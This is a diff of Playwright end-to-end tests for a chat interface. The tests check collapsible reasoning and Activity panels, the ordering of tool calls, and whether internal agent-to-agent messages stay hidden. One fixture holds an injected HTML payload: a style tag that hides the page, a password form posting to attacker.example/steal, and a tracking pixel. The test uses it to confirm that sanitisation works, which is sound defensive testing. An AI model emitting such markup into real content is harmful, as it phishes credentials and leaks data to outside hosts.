@@ -463,11 +463,17 @@ test.describe('Message rendering', () => {
     await page.getByTitle('Close').click()
   })
 
-  test('reasoning-only direct answers have no completed Activity disclosure', async ({ page }) => {
+  test('reasoning stays in nested collapsible Activity beside a direct answer', async ({ page }) => {
     const bubble = page.locator('[data-role="assistant"]').filter({ hasText: /Feather uses .*marked.* with GFM support/ }).first()
     await expect(bubble).toBeVisible()
-    await expect(bubble.getByTestId('work-log-summary')).toHaveCount(0)
-    await expect(page.getByText('Planning the markdown pipeline.')).not.toBeVisible()
+    const activity = bubble.locator('details.work-log')
+    await expect(activity).toHaveJSProperty('open', false)
+    await activity.getByTestId('work-log-summary').click()
+    const reasoning = activity.locator('details').filter({ hasText: 'Reasoning' }).last()
+    await expect(reasoning).toBeVisible()
+    await expect(reasoning).toHaveJSProperty('open', false)
+    await reasoning.locator('summary').click()
+    await expect(reasoning).toContainText('Planning')
   })
 
   test('assistant text beside a tool call stays exposed outside Activity', async ({ page }) => {
@@ -705,7 +711,7 @@ test('Wiki loads the selected chat Room caretaker synthesis', async ({ page }) =
   await expect(panel.getByRole('button', { name: 'Updates', exact: true })).toHaveCount(0)
 })
 
-test('Room Sidecar A2A is visible and passively rendered in the canonical Leader chat', async ({ page }) => {
+test('Room Sidecar A2A stays internal to the canonical Leader chat', async ({ page }) => {
   const a2a = [
     { seq: 1, ts: Date.parse('2026-08-30T12:00:00Z'), from: 'leader', to: 'caretaker', text: 'Check the Wiki decision.' },
     { seq: 3, ts: Date.parse('2026-08-30T12:00:02Z'), from: 'caretaker', to: 'leader', text: '<style>body{display:none}</style><form action="https://attacker.example/steal"><input name="password"></form>![pixel](https://attacker.example/pixel)' },
@@ -716,7 +722,9 @@ test('Room Sidecar A2A is visible and passively rendered in the canonical Leader
     remoteMediaRequests++
     await route.abort()
   })
-  await page.route(`**/api/sessions/${TEST_SESSION_ID}/room`, route => route.fulfill({ json: { room: 'feather' } }))
+  await page.route(`**/api/sessions/${TEST_SESSION_ID}/room`, route => route.fulfill({
+    json: { room: 'feather', kind: 'main', role: 'leader', label: 'Main' },
+  }))
   await page.route('**/api/sidecar/room-feather/stream', route => route.fulfill({
     status: 200,
     contentType: 'text/event-stream',
@@ -734,11 +742,10 @@ test('Room Sidecar A2A is visible and passively rendered in the canonical Leader
   } }))
 
   await page.goto(`${BASE}/#${TEST_SESSION_ID}`)
-  await expect(page.getByText('Check the Wiki decision.')).toBeVisible()
-  await expect(page.getByText('Decision is current.')).toBeVisible()
+  await expect(page.getByText('Check the Wiki decision.')).toHaveCount(0)
+  await expect(page.getByText('Decision is current.')).toHaveCount(0)
   await expect(page.getByText(/\[feather-sidecar room-feather/)).toHaveCount(0)
-  const passiveMarkdown = page.locator('.markdown').filter({ hasText: 'Decision is current.' })
-  await expect(passiveMarkdown.locator('style, form, input[name="password"], img[src*="attacker.example"]')).toHaveCount(0)
+  await expect(page.getByTestId('chat-panel').locator('form, input[name="password"], img[src*="attacker.example"]')).toHaveCount(0)
   expect(remoteMediaRequests).toBe(0)
 })
 
@@ -806,6 +813,50 @@ test.describe('Live updates', () => {
     await expect(liveWork).toHaveCount(0)
     const finalBubble = page.locator('[data-role="assistant"]').filter({ hasText: 'Status lifecycle complete.' })
     await expect(finalBubble.getByTestId('work-log-summary')).toBeVisible()
+  })
+
+  test('reasoning stays chronologically between tool calls inside Activity', async ({ page }) => {
+    const streamRequest = page.waitForRequest(request => request.url().includes(`/api/sessions/${TEST_SESSION_ID}/stream`))
+    await page.goto(`${BASE}/#${TEST_SESSION_ID}`)
+    await expect(page.locator('.markdown').first()).toBeVisible({ timeout: 10000 })
+    await streamRequest
+    const stamp = Date.now()
+    writeLine({
+      type: 'user', uuid: `e2e-reason-user-${stamp}`, timestamp: '2025-06-15T14:07:00Z',
+      isSidechain: false, isMeta: false,
+      message: { role: 'user', content: 'Check reasoning chronology.' },
+    })
+    writeLine({
+      type: 'assistant', uuid: `e2e-reason-tool-1-${stamp}`, timestamp: '2025-06-15T14:07:01Z',
+      isSidechain: false, isMeta: false,
+      message: { role: 'assistant', content: [{ type: 'tool_use', id: `reason-tool-1-${stamp}`, name: 'read', input: { path: '/tmp/first' }, intent: 'Reading first evidence' }] },
+    })
+    writeLine({
+      type: 'assistant', uuid: `e2e-reasoning-${stamp}`, timestamp: '2025-06-15T14:07:02Z',
+      isSidechain: false, isMeta: false,
+      message: { role: 'assistant', content: [{ type: 'thinking', thinking: 'The first result changes what the second check should inspect.' }] },
+    })
+    writeLine({
+      type: 'assistant', uuid: `e2e-reason-tool-2-${stamp}`, timestamp: '2025-06-15T14:07:03Z',
+      isSidechain: false, isMeta: false,
+      message: { role: 'assistant', content: [{ type: 'tool_use', id: `reason-tool-2-${stamp}`, name: 'grep', input: { pattern: 'second' }, intent: 'Checking second evidence' }] },
+    })
+    writeLine({
+      type: 'assistant', uuid: `e2e-reason-final-${stamp}`, timestamp: '2025-06-15T14:07:04Z',
+      isSidechain: false, isMeta: false,
+      message: { role: 'assistant', content: 'Reasoning chronology complete.' },
+    })
+
+    const activity = page.locator('[data-role="assistant"]').filter({ hasText: 'Reasoning chronology complete.' }).locator('details.work-log')
+    await expect(activity).toBeVisible({ timeout: 10000 })
+    await activity.getByTestId('work-log-summary').click()
+    const order = await activity.locator('.work-log-detail > details').evaluateAll(nodes =>
+      nodes.map(node => node.textContent || ''))
+    expect(order).toHaveLength(3)
+    expect(order[0]).toContain('Reading first evidence')
+    expect(order[1]).toContain('The first result changes what the second check should inspect.')
+    expect(order[2]).toContain('Checking second evidence')
+    await expect(activity.getByTestId('work-log-detail')).toContainText('2 actions · 1 reasoning')
   })
 
 })
